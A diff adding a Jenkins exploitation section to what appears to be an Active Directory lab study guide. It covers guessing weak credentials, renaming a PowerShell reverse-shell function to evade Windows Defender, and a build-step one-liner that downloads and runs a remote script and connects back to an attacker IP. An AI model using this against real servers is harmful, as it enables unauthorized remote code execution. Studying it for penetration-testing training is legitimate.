@@ -598,6 +598,45 @@ studentx → Local Admin on dcorp-adminsrv
 
 ---
 
+#### Jenkins Server Exploitation (Web Service Abuse)
+
+**Vulnerability Identification:**
+```
+Jenkins instances often have:
+- Weak password policies (many users set password = username)
+- Misconfigured build permissions (non-admin users can Configure builds)
+- Ability to add Build Steps with arbitrary commands
+```
+
+**Exploitation Steps:**
+
+1. **Access Jenkins Console:**
+   - Navigate to Jenkins instance (e.g., http://dcorp-ci:8080)
+   - Check "People" page to enumerate users
+   - Attempt default/weak credentials (e.g., username as password)
+
+2. **Identify User Permissions:**
+   - Look for users with "Configure builds" permission
+   - These users can modify build configurations and add arbitrary build steps
+
+3. **Create Reverse Shell Payload:**
+   ```powershell
+   # Rename function to evade Windows Defender detection
+   # Example: Rename Invoke-PowerShellTcp to "Power"
+   # Include function call at end: Power -Reverse -IPAddress 172.16.100.X -Port 443
+   ```
+
+4. **Add Malicious Build Step:**
+   - Job → Configure → Build → Add Build Step
+   - Command: `powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443`
+   - Use `-encodedcommand` parameter for additional obfuscation if needed
+
+5. **Trigger Build Execution:**
+   - Run build manually or wait for scheduled execution
+   - Reverse shell connects from Jenkins service account (often SYSTEM or high-privilege context)
+
+---
+
 ### Path 1: Local Admin → Domain Admin via Reverse Shell
 
 #### Step 1: Initial Compromise → Local Admin
